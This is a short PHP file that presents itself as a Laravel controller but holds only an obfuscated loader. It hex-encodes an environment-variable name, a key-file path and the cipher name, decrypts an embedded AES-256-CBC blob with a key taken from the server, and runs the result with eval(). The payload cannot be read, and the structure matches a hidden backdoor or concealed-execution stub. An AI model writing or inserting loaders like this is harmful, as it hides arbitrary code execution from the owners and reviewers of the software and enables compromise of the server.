<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7rDUm3hWQuVczAFBzQe6Og==');

$c=base64_decode(

'AY51J4Fmtspa5mKT4+2rmjYwp9JuEKD//uQlvUDMMf6fVs6lUp3SSx3bvXTuI76plSu+BgY8WbAU' .
'6SEXNhO8sZw+IUQny7zWuQoMf2YpBC8WSXpiGI5cLyJDD6xU8wSoP2q2CDnNSnVD5ulRalVxvuGp' .
'9QNpH3I7majOePFEbb5scc62elO3LBv7s/3RmPfKrg0yCGRE45IzhOE9umtoLYHuX4uAS55QCsiY' .
'2kegJtA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

